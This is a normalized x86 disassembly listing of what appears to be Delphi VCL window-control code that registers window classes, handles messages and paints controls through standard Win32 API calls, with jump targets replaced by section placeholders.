call sub_438a84
jmp r-xdata
mov edx ebx
mov eax edi
call sub_437b94
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_438008
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
push 0x0
mov edi ebx
mov ecx edi
mov edx 0xb036
mov eax esi
call sub_435d5c
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax esi
call sub_43b694
test al al
je r-xdata
mov dl 0x1
mov ebp ebx
mov eax ebp
call sub_437e80
mov eax ebp
call sub_4388e8
jmp r-xdata
mov edx ebx
mov eax esi
call sub_437eec
push 0x0
mov ecx edi
mov edx 0xb02c
mov eax esi
call sub_435d5c
mov eax esi
call sub_437c50
pop ebp
pop edi
pop esi
pop ebx
retn
xor ecx ecx
mov dl [ ebx + 0x57 ]
mov eax ebx
call sub_434ffc
sub_438084
push ebx
push esi
push edi
push ebp
mov edi edx
mov ebx eax
mov ebp [ ebx + 0x198 ]
test ebp ebp
je r-xdata
xor esi esi
mov esi [ ebp + 0x8 ]
jmp r-xdata
mov edx edi
sub edx esi
mov eax [ ebx + 0x19c ]
call sub_4138b8
mov edx edi
mov eax ebp
call sub_4138b8
jmp r-xdata
cmp esi edi
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
sub_4380e0
push ebx
push esi
push edi
push ebp
push ecx
mov esi edx
mov [ esp ] eax
mov eax [ esp ]
call sub_4380c0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_438084
mov ebp eax
mov edx esi
mov eax [ ebp + 0x3c ]
call [ ebp + 0x38 ]
cmp [ esi + 0xc ] 0x0
jne r-xdata
sub_438120
add esp 0xfffffff0
movzx edx dx
mov [ esp ] edx
xor edx edx
mov [ esp + 0x4 ] edx
xor edx edx
mov [ esp + 0x8 ] edx
xor edx edx
mov [ esp + 0xc ] edx
mov edx esp
call sub_4380e0
add esp 0x10
retn
sub_438148
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi [ ebx + 0x34 ]
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
mov [ ebx + 0x34 ] edi
mov eax [ ebx + 0x24 ]
and eax 0xffffbf1f
or eax 0x3
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x24 ]
push eax
push esi
push 0x0
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ rw-data ]
mov eax [ eax ]
push eax
call GetClassInfoA
test eax eax
jne r-xdata
lea eax [ ebx + 0x24 ]
push eax
push esi
mov eax [ ebx + 0x34 ]
push eax
call GetClassInfoA
sub_4381b4
push ebx
push esi
push edi
mov edi edx
mov ebx eax
mov eax ebx
call sub_4351ec
test al al
je r-xdata
mov eax ebx
call sub_43521c
test al al
je r-xdata
or [ edi ] 0x2000
mov eax ebx
mov si 0xffc8
call sub_403324
test al al
je r-xdata
or [ edi ] 0x4000
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffca
call sub_403324
test al al
jne r-xdata
mov eax ebx
mov si 0xffca
call sub_403324
cmp al 0x1
jne r-xdata
or [ edi ] 0x1000
jmp r-xdata
or [ edi ] 0x0
sub_43821c
push ebp
mov ebp esp
add esp 0xfffffefc
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_43833a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
xor ecx ecx
mov edx 0x8c
call sub_402b3c
mov eax [ esi + 0x64 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] 0x44000000
lea edx [ ebx + 0x8 ]
mov eax esi
call sub_4381b4
test [ esi + 0x50 ] 0x1
je r-xdata
test [ esi + 0x1c ] 0x10
jne r-xdata
or [ ebx + 0x4 ] 0x2000000
or [ ebx + 0x8 ] 0x10000
cmp [ esi + 0x1a4 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax [ esi + 0x40 ]
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x44 ]
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x48 ]
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x4c ]
mov [ ebx + 0x18 ] eax
mov edi [ esi + 0x30 ]
test edi edi
je r-xdata
or [ ebx + 0x4 ] 0x10000
or [ ebx + 0x4 ] 0x8000000
mov eax [ esi + 0x190 ]
mov [ ebx + 0x1c ] eax
mov eax edi
call sub_43b390
mov [ ebx + 0x1c ] eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xb
mov eax DefWindowProcA
mov [ ebx + 0x28 ] eax
push 0x7f00
push 0x0
call LoadCursorA
mov [ ebx + 0x3c ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov eax [ rw-data ]
mov [ ebx + 0x34 ] eax
lea edx [ ebp - 0x104 ]
mov eax [ esi ]
call sub_403078
lea edx [ ebp - 0x104 ]
lea eax [ ebp - 0x4 ]
call sub_4040dc
mov edx [ ebp - 0x4 ]
lea eax [ ebx + 0x4c ]
call sub_408454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438341
lea eax [ ebp - 0x4 ]
call sub_403e78
retn
sub_438348
push ebp
mov ebp esp
add esp 0xffffff40
push ebx
push esi
xor edx edx
mov [ ebp - 0xc0 ] edx
mov esi eax
xor eax eax
push ebp
push sub_438509
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x98 ]
cmp [ ebp - 0x70 ] 0x0
jne r-xdata
mov eax [ ebp - 0x64 ]
mov [ esi + 0x174 ] eax
lea eax [ ebp - 0xb4 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
call GetClassInfoA
cmp eax 0x1
sbb eax eax
inc eax
test al al
je r-xdata
test [ ebp - 0x85 ] 0x40
je r-xdata
test al al
je r-xdata
mov edx sub_431954
cmp edx [ ebp - 0xb0 ]
je r-xdata
mov ebx [ esi + 0x4 ]
test ebx ebx
je r-xdata
mov [ ebp - 0x64 ] sub_431954
lea eax [ ebp - 0x40 ]
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x68 ]
push eax
call RegisterClassA
test ax ax
jne r-xdata
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x40 ]
push eax
call UnregisterClassA
mov [ rw-data ] esi
lea edx [ ebp - 0x8c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x9c ]
cmp [ esi + 0x180 ] 0x0
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ ebp - 0xbc ] eax
mov [ ebp - 0xb8 ] 0xb
lea eax [ ebp - 0xbc ]
push eax
push 0x0
lea edx [ ebp - 0xc0 ]
mov eax [ rw-data ]
call sub_405978
mov ecx [ ebp - 0xc0 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4038b4
test [ ebx + 0x1c ] 0x2
je r-xdata
call sub_40c714
push 0xfffffff0
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax 0x40000000
je r-xdata
call sub_40c714
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ esi + 0x64 ]
call sub_4085f4
xor eax eax
mov [ esi + 0x64 ] eax
mov eax esi
call sub_43b6a0
push 0x1
mov eax [ esi + 0x68 ]
call sub_41c570
mov ecx eax
mov edx 0x30
mov eax esi
call sub_435d5c
cmp [ esi + 0x5c ] 0x0
je r-xdata
push 0xfffffff4
mov eax [ esi + 0x180 ]
push eax
call GetWindowLongA
test eax eax
jne r-xdata
mov eax ebx
call sub_43b390
mov [ ebp - 0x70 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438510
lea eax [ ebp - 0xc0 ]
call sub_403e78
retn
mov eax esi
mov si 0xffee
call sub_403324
mov eax [ esi + 0x180 ]
push eax
push 0xfffffff4
push eax
call SetWindowLongA
sub_438518
push ebx
push esi
mov ebx edx
mov esi eax
mov eax [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0xc ]
push eax
mov eax [ ebx + 0x10 ]
push eax
mov eax [ ebx + 0x14 ]
push eax
mov eax [ ebx + 0x18 ]
push eax
mov eax [ ebx + 0x1c ]
push eax
push 0x0
mov eax [ ebx + 0x34 ]
push eax
mov eax [ ebx + 0x20 ]
push eax
mov ecx [ ebx ]
lea edx [ ebx + 0x4c ]
mov eax [ ebx + 0x8 ]
call sub_4068b4
mov [ esi + 0x180 ] eax
pop esi
pop ebx
retn
sub_438558
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_417700
mov eax esi
call sub_417650
mov [ ebx + 0x1fa ] eax
mov eax esi
call sub_417650
mov [ ebx + 0x1fe ] eax
or [ ebx + 0x98 ] 0x20
mov eax esi
call sub_417708
pop esi
pop ebx
retn
sub_438590
push ebx
push esi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ esp + 0x8 ]
mov [ ebx + 0x1fa ] eax
mov eax [ esp + 0xc ]
mov [ ebx + 0x1fe ] eax
mov eax esi
call sub_418f4c
mov edx [ ebx + 0x1fa ]
mov eax esi
call sub_418ed8
mov edx [ ebx + 0x1fe ]
mov eax esi
call sub_418ed8
mov eax esi
call sub_418f54
add esp 0x10
pop esi
pop ebx
retn
sub_4385f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x20 ]
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ ebx + 0x1fa ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
add eax 0x1fa
call sub_4385e4
test al al
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0x1 ] 0x0
mov edx [ ebp + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
inc ebx
xor esi esi
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
inc esi
dec ebx
jne r-xdata
mov al [ r-xdata ]
cmp al [ edi + 0x61 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4138b8
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4138b8
mov edi eax
cmp [ edi + 0x5b ] 0x0
jne r-xdata
sub_4386d0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_436094
mov eax [ ebp - 0x8 ]
push eax
push sub_438558
mov eax [ ebp - 0x8 ]
push eax
push sub_438590
push ebp
call sub_4385f8
pop ecx
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_43872c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_434b28
mov esi eax
cmp esi 0x1
jge r-xdata
lea eax [ esi + 0x1 ]
call sub_4085a8
mov edi eax
mov [ ebx + 0x64 ] edi
mov eax edi
call sub_4085bc
mov ecx eax
mov edx edi
mov eax ebx
call sub_434b38
mov eax r-xdata
call sub_4085c8
mov [ ebx + 0x64 ] eax
jmp r-xdata
call sub_4335dc
mov eax ebx
mov edx [ eax ]
call [ edx + 0xac ]
pop edi
pop esi
pop ebx
retn
sub_438784
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
or [ eax + 0x54 ] 0x200
xor eax eax
push ebp
push sub_4387d1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x180 ]
push eax
call DestroyWindow
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4387d8
mov eax [ ebp - 0x4 ]
and [ eax + 0x54 ] 0xfdff
retn
call sub_40c714
sub_4387e8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov eax [ edi + 0x19c ]
mov edx ebx
call sub_413914
mov esi eax
inc esi
mov eax [ edi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
sub ebx esi
jl r-xdata
xor eax eax
inc ebx
pop edi
pop esi
pop ebx
retn
inc esi
dec ebx
jne r-xdata
mov eax [ edi + 0x19c ]
mov edx esi
call sub_4138b8
mov eax [ eax + 0x180 ]
test eax eax
jne r-xdata
sub_438830
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xa0 ]
mov esi ebx
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
push esi
movzx eax [ rw-data ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetPropA
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
mov eax ebx
call sub_4380c0
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x13
push 0x0
push 0x0
push 0x0
push 0x0
mov edx ebx
mov eax esi
call sub_4387e8
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
inc esi
xor edi edi
mov edx edi
mov eax ebx
call sub_438084
call sub_434208
inc edi
dec esi
jne r-xdata
sub_4388cc
push ebp
mov ebp esp
add esp 0xfffffff0
push esi
push edi
mov esi [ ebp + 0x8 ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x14
sub_4388e8
push ebx
push esi
push edi
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x19c ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xb0 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x19c ]
call sub_4138b8
call sub_4388e8
inc edi
dec esi
jne r-xdata
sub_438948
push ebx
push esi
push edi
mov edi eax
mov eax edi
mov si 0xffb5
call sub_403324
mov ebx eax
mov eax edi
call sub_4388e8
mov eax edi
call sub_438a84
test bl bl
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ edi + 0x180 ] 0x0
je r-xdata
mov eax [ edi + 0x180 ]
push eax
call SetFocus
sub_438988
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x54 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
je r-xdata
mov al 0x1
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x180 ] 0x0
jne r-xdata
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov al [ eax + 0x1a6 ]
cmp al [ ebp - 0x5 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x94 ]
mov eax [ ebp - 0x4 ]
mov dl [ ebp - 0x5 ]
mov [ eax + 0x1a6 ] dl
xor eax eax
push ebp
push sub_438a5e
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
xor ecx ecx
mov edx 0xb019
mov eax [ ebp - 0x4 ]
call sub_435d5c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x19c ]
mov edx esi
call sub_4138b8
call sub_438988
inc esi
dec ebx
jne r-xdata
sub_438a84
push ebx
push esi
mov esi eax
mov ebx esi
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4032b4
test al al
jne r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_438988
cmp [ ebx + 0x190 ] 0x0
je r-xdata
sub_438ac4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp esi [ ebx + 0x190 ]
je r-xdata
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax ebx
call sub_4388e8
mov [ ebx + 0x190 ] esi
cmp [ ebx + 0x190 ] 0x0
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x190 ] esi
push esi
mov eax [ ebx + 0x180 ]
push eax
call SetParent
mov eax [ rw-data ]
cmp [ eax ] 0x5
jl r-xdata
mov eax ebx
call sub_438a84
mov eax [ rw-data ]
cmp [ eax ] 0x2
jne r-xdata
push 0x0
mov dx 0x3
mov ax 0x3
call sub_4068a4
mov ecx eax
mov edx 0x127
mov eax ebx
call sub_435d5c
jmp r-xdata
sub_438b4c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_438ba4
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_438b93
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438b9a
call sub_4335dc
call sub_4202a8
retn
sub_438bc4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx eax
lea ecx [ ebp - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov edx [ edx + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
sub eax [ ebx + 0x40 ]
call sub_41245c
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x8 ]
mov [ eax - 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ eax - 0x8 ] edx
mov eax [ ebp + 0x8 ]
push [ eax - 0x8 ]
push [ eax - 0xc ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
test al al
je r-xdata
cmp [ ebx + 0x57 ] 0x0
je r-xdata
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov [ edx - 0x14 ] ebx
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov al 0x1
test [ ebx + 0x51 ] 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
add eax 0xfffffff4
call sub_40688c
push eax
xor ecx ecx
mov edx 0xb00a
mov eax ebx
call sub_435d5c
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0xd ] 0x0
je r-xdata
sub_438c7c
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
mov [ ebp - 0xd ] cl
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
mov [ ebp - 0x14 ] eax
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x198 ]
test eax eax
je r-xdata
cmp [ esi + 0x19c ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov eax [ esi + 0x19c ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x19c ]
call sub_4138b8
call sub_438bc4
pop ecx
test al al
jne r-xdata
push ebp
mov edx ebx
mov eax [ esi + 0x198 ]
call sub_4138b8
call sub_438bc4
pop ecx
test al al
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
sub_438d10
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_43b390
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406878
lea edx [ esp + 0xc ]
xor ecx ecx
mov eax ebx
call sub_438c7c
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
movsx eax [ esi + 0x8 ]
sub eax [ ebx + 0x40 ]
mov [ esp ] eax
movsx eax [ esi + 0xa ]
sub eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
mov eax esp
call sub_40688c
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
mov eax ebx
call sub_435d5c
mov [ esi + 0xc ] eax
mov al 0x1
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
xor eax eax
test ebx ebx
je r-xdata
mov ebx [ rw-data ]
jmp r-xdata
sub_438da4
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0x84
jg r-xdata
add eax 0xffffff00
sub eax 0x9
jb r-xdata
je r-xdata
mov eax ebx
call sub_435318
test al al
jne r-xdata
add eax 0xffffff09
sub eax 0xb
jb r-xdata
mov edx esi
mov eax ebx
call sub_435e28
cmp [ esi + 0xc ] 0xffffffff
jne r-xdata
sub eax 0x7
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
jmp r-xdata
mov edx esi
mov eax ebx
call sub_438d10
test al al
je r-xdata
jmp r-xdata
push 0x0
lea edx [ esp + 0xc ]
mov eax [ esi + 0x8 ]
call sub_406878
lea edx [ esp + 0xc ]
lea ecx [ esp + 0x4 ]
mov eax ebx
call sub_4346f8
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax ebx
call sub_438c7c
test eax eax
je r-xdata
mov eax ebx
call sub_44c6fc
mov edi eax
test edi edi
je r-xdata
dec eax
je r-xdata
mov edx esi
mov eax ebx
call sub_435e28
cmp [ esi + 0xc ] 0x0
jne r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xe8 ]
test al al
je r-xdata
test [ ebx + 0x54 ] 0x20
jne r-xdata
sub eax 0x17
je r-xdata
mov eax ebx
call sub_43b694
test al al
je r-xdata
jmp r-xdata
jmp r-xdata
mov eax ebx
call sub_43b390
mov edi eax
call GetCapture
cmp edi eax
jne r-xdata
jmp r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax ebx
call sub_43b390
push eax
call DefWindowProcA
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0x1f
mov eax [ rw-data ]
call sub_435d5c
sub_438f08
push ebx
push esi
push edi
push ebp
mov ebx edx
mov esi eax
cmp [ esi + 0x180 ] 0x0
je r-xdata
mov edx ebx
mov eax esi
call sub_435fbc
mov edi [ ebx ]
cmp edi 0x7b
jne r-xdata
mov edi [ ebx ]
mov eax edi
add eax 0xfffffece
sub eax 0x7
jb r-xdata
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov ebp [ ebx + 0x8 ]
push ebp
mov eax [ ebx + 0x4 ]
push eax
add edi 0xbc00
push edi
push ebp
call SendMessageA
mov [ ebx + 0xc ] eax
jmp r-xdata
add eax 0xffff4407
sub eax 0x7
jb r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx edi
mov eax [ esi + 0x30 ]
call sub_435d5c
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
mov eax [ ebx ]
cmp eax 0xc
jne r-xdata
mov eax [ esi + 0x68 ]
mov eax [ eax + 0x18 ]
call sub_41c09c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetTextColor
mov eax [ esi + 0x170 ]
call sub_41cd40
call sub_41c09c
push eax
mov eax [ ebx + 0x4 ]
push eax
call SetBkColor
mov eax [ esi + 0x170 ]
call sub_41cd7c
mov [ ebx + 0xc ] eax
jmp r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x8 ]
push edx
mov ecx [ ebx + 0x4 ]
mov edx eax
mov eax esi
call sub_434754
jmp r-xdata
cmp edi [ rw-data ]
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push edi
mov eax [ esi + 0x180 ]
push eax
mov eax [ esi + 0x174 ]
push eax
call CallWindowProcA
mov [ ebx + 0xc ] eax
mov [ ebx + 0xc ] esi
jmp r-xdata
sub_439010
push ebx
push esi
push edi
mov esi edx
xor ebx ebx
call sub_431a40
mov edi eax
test edi edi
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov eax [ esi + 0x8 ]
push eax
mov ecx [ esi + 0x4 ]
mov edx [ esi ]
add edx 0xbc00
mov eax edi
call sub_435d5c
mov [ esi + 0xc ] eax
mov bl 0x1
sub_439044
push ebp
mov ebp esp
add esp 0xffffffb0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp - 0x8 ]
mov ebx [ ebx + 0x4 ]
test ebx ebx
jne r-xdata
xor edx edx
push ebp
push sub_439164
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x198 ] 0x0
jne r-xdata
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call BeginPaint
mov ebx eax
push ebx
call SaveDC
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x2
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
jmp r-xdata
cmp [ ebp - 0xc ] 0x1
je r-xdata
inc edi
xor esi esi
xor ecx ecx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43919c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43916b
mov eax [ ebp - 0x8 ]
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x10 ]
push eax
push ebx
call RestoreDC
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xb8 ]
test [ eax + 0x50 ] 0x40
je r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
retn
lea eax [ ebp - 0x50 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_43b390
push eax
call EndPaint
inc esi
dec edi
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
push edx
mov eax [ eax + 0x40 ]
push eax
push ebx
call ExcludeClipRect
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x1
je r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x198 ]
mov edx esi
call sub_4138b8
cmp [ eax + 0x57 ] 0x0
jne r-xdata
sub_43919c
push ebx
